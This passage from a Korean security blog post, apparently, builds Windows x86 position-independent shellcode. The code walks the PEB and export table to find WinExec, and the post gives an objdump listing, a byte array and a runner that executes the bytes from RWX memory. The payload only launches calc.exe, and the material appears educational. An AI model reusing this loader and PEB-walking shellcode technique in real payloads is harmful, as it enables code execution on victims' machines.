ordinal * sizeof(int)); char* WinExec_Addr = (char*)(DllBase + WinExec_RVA); char calcexe[] = {0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00}; // WinExec 호출 int (*WinExec)(const char *, unsigned int) = (int (*)(const char *, unsigned int))WinExec_Addr; WinExec(calcexe, 0); return 0; } 쉘코드 추출 objdump를 통해 바이트 코드로 추출하였다.\n_main 함수에서 PEB를 가져오는 부분부터 호출하는 부분까지만 사용하면 된다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 4014fe:\t64 a1 30 00 00 00 mov %fs:0x30,%eax 401504:\t89 44 24 78 mov %eax,0x78(%esp) 401508:\t8b 44 24 78 mov 0x78(%esp),%eax 40150c:\t83 c0 0c add $0xc,%eax 40150f:\t8b 00 mov (%eax),%eax 401511:\t89 44 24 74 mov %eax,0x74(%esp) 401515:\t8b 44 24 74 mov 0x74(%esp),%eax 401519:\t83 c0 14 add $0x14,%eax 40151c:\t8b 00 mov (%eax),%eax 40151e:\t89 44 24 70 mov %eax,0x70(%esp) 401522:\t8b 44 24 70 mov 0x70(%esp),%eax 401526:\t8b 00 mov (%eax),%eax 401528:\t89 44 24 6c mov %eax,0x6c(%esp) 40152c:\t8b 44 24 6c mov 0x6c(%esp),%eax 401530:\t8b 00 mov (%eax),%eax 401532:\t89 44 24 68 mov %eax,0x68(%esp) 401536:\t8b 44 24 68 mov 0x68(%esp),%eax 40153a:\t83 c0 10 add $0x10,%eax 40153d:\t8b 00 mov (%eax),%eax 40153f:\t89 44 24 64 mov %eax,0x64(%esp) 401543:\t8b 44 24 64 mov 0x64(%esp),%eax 401547:\t8b 40 3c mov 0x3c(%eax),%eax 40154a:\t89 44 24 60 mov %eax,0x60(%esp) 40154e:\t8b 54 24 60 mov 0x60(%esp),%edx 401552:\t8b 44 24 64 mov 0x64(%esp),%eax 401556:\t01 d0 add %edx,%eax 401558:\t89 44 24 5c mov %eax,0x5c(%esp) 40155c:\t8b 44 24 5c mov 0x5c(%esp),%eax 401560:\t83 c0 18 add $0x18,%eax 401563:\t89 44 24 58 mov %eax,0x58(%esp) 401567:\t8b 44 24 58 mov 0x58(%esp),%eax 40156b:\t83 c0 60 add $0x60,%eax 40156e:\t89 44 24 54 mov %eax,0x54(%esp) 401572:\t8b 44 24 54 mov 0x54(%esp),%eax 401576:\t8b 00 mov (%eax),%eax 401578:\t89 44 24 50 mov %eax,0x50(%esp) 40157c:\t8b 54 24 50 mov 0x50(%esp),%edx 401580:\t8b 44 24 64 mov 0x64(%esp),%eax 401584:\t01 d0 add %edx,%eax 401586:\t89 44 24 4c mov %eax,0x4c(%esp) 40158a:\t8b 44 24 4c mov 0x4c(%esp),%eax 40158e:\t83 c0 1c add $0x1c,%eax 401591:\t8b 00 mov (%eax),%eax 401593:\t89 c2 mov %eax,%edx 401595:\t8b 44 24 64 mov 0x64(%esp),%eax 401599:\t01 d0 add %edx,%eax 40159b:\t89 44 24 48 mov %eax,0x48(%esp) 40159f:\t8b 44 24 4c mov 0x4c(%esp),%eax 4015a3:\t83 c0 20 add $0x20,%eax 4015a6:\t8b 00 mov (%eax),%eax 4015a8:\t89 c2 mov %eax,%edx 4015aa:\t8b 44 24 64 mov 0x64(%esp),%eax 4015ae:\t01 d0 add %edx,%eax 4015b0:\t89 44 24 44 mov %eax,0x44(%esp) 4015b4:\t8b 44 24 4c mov 0x4c(%esp),%eax 4015b8:\t83 c0 24 add $0x24,%eax 4015bb:\t8b 00 mov (%eax),%eax 4015bd:\t89 c2 mov %eax,%edx 4015bf:\t8b 44 24 64 mov 0x64(%esp),%eax 4015c3:\t01 d0 add %edx,%eax 4015c5:\t89 44 24 40 mov %eax,0x40(%esp) 4015c9:\tc7 44 24 7c 00 00 00 movl $0x0,0x7c(%esp) 4015d0:\t00 4015d1:\tc7 44 24 20 57 69 6e movl $0x456e6957,0x20(%esp) 4015d8:\t45 4015d9:\tc7 44 24 24 78 65 63 movl $0x636578,0x24(%esp) 4015e0:\t00 4015e1:\t8b 44 24 7c mov 0x7c(%esp),%eax 4015e5:\t8d 14 85 00 00 00 00 lea 0x0(,%eax,4),%edx 4015ec:\t8b 44 24 44 mov 0x44(%esp),%eax 4015f0:\t01 d0 add %edx,%eax 4015f2:\t8b 00 mov (%eax),%eax 4015f4:\t89 c2 mov %eax,%edx 4015f6:\t8b 44 24 64 mov 0x64(%esp),%eax 4015fa:\t01 d0 add %edx,%eax 4015fc:\t89 44 24 3c mov %eax,0x3c(%esp) 401600:\t8b 44 24 3c mov 0x3c(%esp),%eax 401604:\t0f b6 10 movzbl (%eax),%edx 401607:\t0f b6 44 24 20 movzbl 0x20(%esp),%eax 40160c:\t38 c2 cmp %al,%dl 40160e:\t75 72 jne 401682 \u0026lt;_main+0x192\u0026gt; 401610:\t8b 44 24 3c mov 0x3c(%esp),%eax 401614:\t83 c0 01 add $0x1,%eax 401617:\t0f b6 10 movzbl (%eax),%edx 40161a:\t0f b6 44 24 21 movzbl 0x21(%esp),%eax 40161f:\t38 c2 cmp %al,%dl 401621:\t75 5f jne 401682 \u0026lt;_main+0x192\u0026gt; 401623:\t8b 44 24 3c mov 0x3c(%esp),%eax 401627:\t83 c0 02 add $0x2,%eax 40162a:\t0f b6 10 movzbl (%eax),%edx 40162d:\t0f b6 44 24 22 movzbl 0x22(%esp),%eax 401632:\t38 c2 cmp %al,%dl 401634:\t75 4c jne 401682 \u0026lt;_main+0x192\u0026gt; 401636:\t8b 44 24 3c mov 0x3c(%esp),%eax 40163a:\t83 c0 03 add $0x3,%eax 40163d:\t0f b6 10 movzbl (%eax),%edx 401640:\t0f b6 44 24 23 movzbl 0x23(%esp),%eax 401645:\t38 c2 cmp %al,%dl 401647:\t75 39 jne 401682 \u0026lt;_main+0x192\u0026gt; 401649:\t8b 44 24 3c mov 0x3c(%esp),%eax 40164d:\t83 c0 04 add $0x4,%eax 401650:\t0f b6 10 movzbl (%eax),%edx 401653:\t0f b6 44 24 24 movzbl 0x24(%esp),%eax 401658:\t38 c2 cmp %al,%dl 40165a:\t75 26 jne 401682 \u0026lt;_main+0x192\u0026gt; 40165c:\t8b 44 24 3c mov 0x3c(%esp),%eax 401660:\t83 c0 05 add $0x5,%eax 401663:\t0f b6 10 movzbl (%eax),%edx 401666:\t0f b6 44 24 25 movzbl 0x25(%esp),%eax 40166b:\t38 c2 cmp %al,%dl 40166d:\t75 13 jne 401682 \u0026lt;_main+0x192\u0026gt; 40166f:\t8b 44 24 3c mov 0x3c(%esp),%eax 401673:\t83 c0 06 add $0x6,%eax 401676:\t0f b6 10 movzbl (%eax),%edx 401679:\t0f b6 44 24 26 movzbl 0x26(%esp),%eax 40167e:\t38 c2 cmp %al,%dl 401680:\t74 0a je 40168c \u0026lt;_main+0x19c\u0026gt; 401682:\t83 44 24 7c 01 addl $0x1,0x7c(%esp) 401687:\te9 55 ff ff ff jmp 4015e1 \u0026lt;_main+0xf1\u0026gt; 40168c:\t90 nop 40168d:\t8b 44 24 7c mov 0x7c(%esp),%eax 401691:\t89 44 24 38 mov %eax,0x38(%esp) 401695:\t8b 44 24 38 mov 0x38(%esp),%eax 401699:\t8d 14 00 lea (%eax,%eax,1),%edx 40169c:\t8b 44 24 40 mov 0x40(%esp),%eax 4016a0:\t01 d0 add %edx,%eax 4016a2:\t0f b7 00 movzwl (%eax),%eax 4016a5:\t66 89 44 24 36 mov %ax,0x36(%esp) 4016aa:\t0f bf 44 24 36 movswl 0x36(%esp),%eax 4016af:\t8d 14 85 00 00 00 00 lea 0x0(,%eax,4),%edx 4016b6:\t8b 44 24 48 mov 0x48(%esp),%eax 4016ba:\t01 d0 add %edx,%eax 4016bc:\t8b 00 mov (%eax),%eax 4016be:\t89 44 24 30 mov %eax,0x30(%esp) 4016c2:\t8b 54 24 30 mov 0x30(%esp),%edx 4016c6:\t8b 44 24 64 mov 0x64(%esp),%eax 4016ca:\t01 d0 add %edx,%eax 4016cc:\t89 44 24 2c mov %eax,0x2c(%esp) 4016d0:\tc7 44 24 17 63 61 6c movl $0x636c6163,0x17(%esp) 4016d7:\t63 4016d8:\tc7 44 24 1b 2e 65 78 movl $0x6578652e,0x1b(%esp) 4016df:\t65 4016e0:\tc6 44 24 1f 00 movb $0x0,0x1f(%esp) 4016e5:\t8b 44 24 2c mov 0x2c(%esp),%eax 4016e9:\t89 44 24 28 mov %eax,0x28(%esp) 4016ed:\tc7 44 24 04 00 00 00 movl $0x0,0x4(%esp) 4016f4:\t00 4016f5:\t8d 44 24 17 lea 0x17(%esp),%eax 4016f9:\t89 04 24 mov %eax,(%esp) 4016fc:\t8b 44 24 28 mov 0x28(%esp),%eax 401700:\tff d0 call *%eax 쉘코드 실행 메모리에 쉘코드를 복사하여 실행하면 계산기가 실행되는 것을 확인할 수 있다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // compile : gcc -o shellcode_runner.exe shellcode_runner.c #include \u0026lt;windows.h\u0026gt; unsigned char shellcode[] = { 0x64, 0xa1, 0x30, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x78, 0x8b, 0x44, 0x24, 0x78, 0x83, 0xc0, 0x0c, 0x8b, 0x00, 0x89, 0x44, 0x24, 0x74, 0x8b, 0x44, 0x24, 0x74, 0x83, 0xc0, 0x14, 0x8b, 0x00, 0x89, 0x44, 0x24, 0x70, 0x8b, 0x44, 0x24, 0x70, 0x8b, 0x00, 0x89, 0x44, 0x24, 0x6c, 0x8b, 0x44, 0x24, 0x6c, 0x8b, 0x00, 0x89, 0x44, 0x24, 0x68, 0x8b, 0x44, 0x24, 0x68, 0x83, 0xc0, 0x10, 0x8b, 0x00, 0x89, 0x44, 0x24, 0x64, 0x8b, 0x44, 0x24, 0x64, 0x8b, 0x40, 0x3c, 0x89, 0x44, 0x24, 0x60, 0x8b, 0x54, 0x24, 0x60, 0x8b, 0x44, 0x24, 0x64, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x5c, 0x8b, 0x44, 0x24, 0x5c, 0x8b, 0x40, 0x78, 0x89, 0x44, 0x24, 0x58, 0x8b, 0x54, 0x24, 0x58, 0x8b, 0x44, 0x24, 0x64, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x54, 0x8b, 0x44, 0x24, 0x54, 0x83, 0xc0, 0x1c, 0x8b, 0x00, 0x89, 0xc2, 0x8b, 0x44, 0x24, 0x64, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x50, 0x8b, 0x44, 0x24, 0x54, 0x83, 0xc0, 0x20, 0x8b, 0x00, 0x89, 0xc2, 0x8b, 0x44, 0x24, 0x64, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x4c, 0x8b, 0x44, 0x24, 0x54, 0x83, 0xc0, 0x24, 0x8b, 0x00, 0x89, 0xc2, 0x8b, 0x44, 0x24, 0x64, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x48, 0xc7, 0x44, 0x24, 0x7c, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x28, 0x57, 0x69, 0x6e, 0x45, 0xc7, 0x44, 0x24, 0x2c, 0x78, 0x65, 0x63, 0x00, 0x8b, 0x44, 0x24, 0x7c, 0x8d, 0x14, 0x85, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x4c, 0x01, 0xd0, 0x8b, 0x00, 0x89, 0xc2, 0x8b, 0x44, 0x24, 0x64, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x44, 0x8b, 0x44, 0x24, 0x44, 0x0f, 0xb6, 0x10, 0x0f, 0xb6, 0x44, 0x24, 0x28, 0x38, 0xc2, 0x75, 0x72, 0x8b, 0x44, 0x24, 0x44, 0x83, 0xc0, 0x01, 0x0f, 0xb6, 0x10, 0x0f, 0xb6, 0x44, 0x24, 0x29, 0x38, 0xc2, 0x75, 0x5f, 0x8b, 0x44, 0x24, 0x44, 0x83, 0xc0, 0x02, 0x0f, 0xb6, 0x10, 0x0f, 0xb6, 0x44, 0x24, 0x2a, 0x38, 0xc2, 0x75, 0x4c, 0x8b, 0x44, 0x24, 0x44, 0x83, 0xc0, 0x03, 0x0f, 0xb6, 0x10, 0x0f, 0xb6, 0x44, 0x24, 0x2b, 0x38, 0xc2, 0x75, 0x39, 0x8b, 0x44, 0x24, 0x44, 0x83, 0xc0, 0x04, 0x0f, 0xb6, 0x10, 0x0f, 0xb6, 0x44, 0x24, 0x2c, 0x38, 0xc2, 0x75, 0x26, 0x8b, 0x44, 0x24, 0x44, 0x83, 0xc0, 0x05, 0x0f, 0xb6, 0x10, 0x0f, 0xb6, 0x44, 0x24, 0x2d, 0x38, 0xc2, 0x75, 0x13, 0x8b, 0x44, 0x24, 0x44, 0x83, 0xc0, 0x06, 0x0f, 0xb6, 0x10, 0x0f, 0xb6, 0x44, 0x24, 0x2e, 0x38, 0xc2, 0x74, 0x0a, 0x83, 0x44, 0x24, 0x7c, 0x01, 0xe9, 0x55, 0xff, 0xff, 0xff, 0x90, 0x8b, 0x44, 0x24, 0x7c, 0x89, 0x44, 0x24, 0x40, 0x8b, 0x44, 0x24, 0x40, 0x8d, 0x14, 0x00, 0x8b, 0x44, 0x24, 0x48, 0x01, 0xd0, 0x0f, 0xb7, 0x00, 0x66, 0x89, 0x44, 0x24, 0x3e, 0x0f, 0xbf, 0x44, 0x24, 0x3e, 0x8d, 0x14, 0x85, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x50, 0x01, 0xd0, 0x8b, 0x00, 0x89, 0x44, 0x24, 0x38, 0x8b, 0x54, 0x24, 0x38, 0x8b, 0x44, 0x24, 0x64, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x34, 0xc7, 0x44, 0x24, 0x1f, 0x63, 0x61, 0x6c, 0x63, 0xc7, 0x44, 0x24, 0x23, 0x2e, 0x65, 0x78, 0x65, 0xc6, 0x44, 0x24, 0x27, 0x00, 0x8b, 0x44, 0x24, 0x34, 0x89, 0x44, 0x24, 0x30, 0xc7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, 0x1f, 0x89, 0x04, 0x24, 0x8b, 0x44, 0x24, 0x30, 0xff, 0xd0 }; int main() { void* exec_mem = VirtualAlloc( NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ); memcpy(exec_mem, shellcode, sizeof(shellcode)); ((void(*)())exec_mem)(); return 0; } ","date":"2025-03-04T00:00:00Z","permalink":"https://t43w00.netlify.app/p/windows-x86-universal-shellcode/","title":"Windows x86 Universal Shellcode"}]